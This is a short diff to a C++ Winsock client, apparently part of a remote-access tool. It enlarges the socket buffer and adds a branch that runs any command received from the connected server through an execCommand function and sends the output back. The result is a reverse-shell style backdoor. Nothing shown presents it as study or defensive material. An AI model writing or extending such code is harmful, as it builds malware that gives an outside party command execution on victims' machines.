@@ -10,7 +10,7 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
-#define DEFAULT_BUFLEN 512
+#define DEFAULT_BUFLEN 2048
 
 int main() {
     WSADATA wsaData;
@@ -87,6 +87,12 @@ int main() {
                 WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], sizeNeeded, NULL, NULL);
 
                 strcpy_s(sendbuf, strTo.c_str());
+                send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
+            }
+            else
+            {
+                std::string output = execCommand(std::string(recvbuf, iResult).c_str());
+                strcpy_s(sendbuf, output.c_str());
                 send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
             }
         }
